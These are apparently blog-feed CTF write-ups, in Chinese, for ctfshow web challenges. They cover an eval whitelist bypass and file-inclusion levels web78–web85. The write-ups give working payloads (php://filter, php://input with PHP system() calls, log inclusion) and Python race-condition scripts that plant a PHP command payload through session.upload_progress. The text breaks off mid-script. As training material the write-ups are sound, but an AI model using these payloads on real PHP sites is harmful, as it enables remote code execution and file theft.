<span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了base_convert()和getallheaders配合使用!<br>base_convert() 函数在任意进制之间转换数字。<br>getallheaders获得所有 HTTP 变量值。<br>dechex()：把十进制数转换为十六进制数<br>hex2bin()：把十六进制值的字符串转换为 ASCII 字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//得到1751504350，从36进制转换到10进制，36进制包含10个数字和26个字母</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;getallheaders&#x27;</span>,<span class="number">30</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功</span></span><br></pre></td></tr></table></figure><p>开始构造url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) </span><br><span class="line">或者下面这个一get形式进行的！</span><br><span class="line">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1835587570&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow文件包含</title>
      <link href="posts/2850254f/"/>
      <url>posts/2850254f/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要用php伪协议php://filter来构造payload!!!</p><blockquote><p>首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</p></blockquote><blockquote><p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p></blockquote><blockquote><p>而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6353b67d-da0e-4c8b-b809-f38701febab0.challenge.ctf.show:8080&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>用base64解码即可！！！</p><hr /><h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><p>这道题使用php://input伪协议！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个替代函数str_replace，所以上一题的做法行不通了！<br><img src="https://img-blog.csdnimg.cn/20210410193146689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>php不能小写，小写的话就通不过了！<br>flag就出现了！！！</p><hr /><h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了个data，可以继续使用上一题的做法！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//d606ef66-3d5c-48e0-9d6b-a4d7638a7e35.challenge.ctf.show:8080/?file=Php://input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;ls&quot;</span>);<span class="comment">#这里是先查看有什么文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;tac fl0g.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样子就flag出来了！</p><hr /><h1 id="web81-日志包含"><a href="#web81-日志包含" class="headerlink" title="web81(日志包含)"></a>web81(日志包含)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目提示是日志包含<br>过滤了:号！<br>先这样！<br><img src="https://img-blog.csdnimg.cn/2021041019541352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再这样！<br><img src="https://img-blog.csdnimg.cn/20210410195254203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后再这样！<br><img src="https://img-blog.csdnimg.cn/20210410195535878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>“$flag=”ctfshow{9e21d7f0-9154-4508-98c5-7816eb523a29}”</p><hr /><h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>1.session.upload_progress.enabled = on<br>2.session.upload_progress.cleanup = on<br>3.session.upload_progress.prefix = “upload_progress_”<br>4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”<br>5.session.use_strict_mode=off<br>第一个表示当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中<br>第二个表示当文件上传结束后，php将会立即清空对应session文件中的内容<br>第三和第四个prefix+name将表示为session中的键名<br>第五个表示我们对Cookie中sessionID可控</p></blockquote><p>把.给过滤掉了！上面有php5.4之后php.ini的默认选项。<br>利用session.upload_progress将木马写入session文件，然后包含这个文件，所以我们需要创建一个session文件，并且知道session文件的存放位置</p><blockquote><p>linux系统中session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p></blockquote><p><strong>条件竞争</strong> 是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">requests.request()----- 构造一个请求，支撑以下各方法的基础方法</span><br><span class="line">requests.get()----- 获取HTML网页的主要方法，对应于HTTP的GET方法</span><br><span class="line">requests.head()----- 获取HTML网页头信息的方法，对应于HTTP的HEAD方法</span><br><span class="line">requests.post()----- 向HTML页面提交POST请求的方法，对应于HTTP的POST</span><br><span class="line">requests.put()-----向HTML页面提交PUT请求的方法，对应于HTTP的PUT</span><br><span class="line">requests.patch()------向HTML页面提交布局修改请求，对应于HTTP的PATCH</span><br><span class="line">requests.delete()------向HTML页面提交删除请求，对应于HTTP的DELETE</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.BytesIO内存中读取二进制</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210411161312321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io<span class="comment">#io库</span></span><br><span class="line"><span class="keyword">import</span> requests<span class="comment">#requests库</span></span><br><span class="line"><span class="keyword">import</span> threading<span class="comment">#多线程库</span></span><br><span class="line">url = <span class="string">&#x27;http://9b38fa03-9e08-41f9-9de7-8f12f7604fc6.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span></span><br><span class="line">    &#125;<span class="comment">#构造数据，有个特殊字符dotast，这个用来判断响应包是否是我们想要的</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#循环着，进行条件竞争</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;flag&#x27;</span>&#125;,data=data,files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;dota.txt&#x27;</span>,f)&#125;)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#持续的读入text，直至成功</span></span><br><span class="line">        response = session.get(url+<span class="string">&quot;?file=/tmp/sess_flag&quot;</span>)<span class="comment">#以get访问该临时文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotast&#x27;</span> <span class="keyword">in</span> response.text:<span class="comment">#如果出现该特殊字符</span></span><br><span class="line">            print(response.text)<span class="comment">#说明成功竞争到资源</span></span><br><span class="line">            <span class="keyword">break</span><span class="comment">#结束程序</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;NO&quot;</span>)<span class="comment">#没有成功</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    write = threading.Thread(target=write,args=(session,))<span class="comment">#开启多线程竞争</span></span><br><span class="line">    write.daemon = <span class="literal">True</span><span class="comment">#这个的意思就是主线程结束，子线程也跟着结束了</span></span><br><span class="line">    write.start()<span class="comment">#开始多线程运行</span></span><br><span class="line">    read(session)<span class="comment">#读入text</span></span><br></pre></td></tr></table></figure><hr /><h1 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续利用session文件包含，使用上题脚本运行即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210411162255154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里多了个rm -rf但是不用担心，继续上一个脚本，只要一直传就有机会！不够确实有点慢。</p><hr /><h1 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>die() 函数输出一条消息，并退出当前脚本<br>所以这里我们就要多加线程了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://a7944473-aada-4608-a051-50b8b3f78110.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    datas =&#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;koctf&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;flag&#x27;</span>&#125;,data=datas,files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;dota.txt&#x27;</span>,f)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&quot;?file=/tmp/sess_flag&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;koctf&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;NO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里再补充一个通杀脚本！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://873190e1-396b-43bb-b91e-24c0e7eaeec3.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span 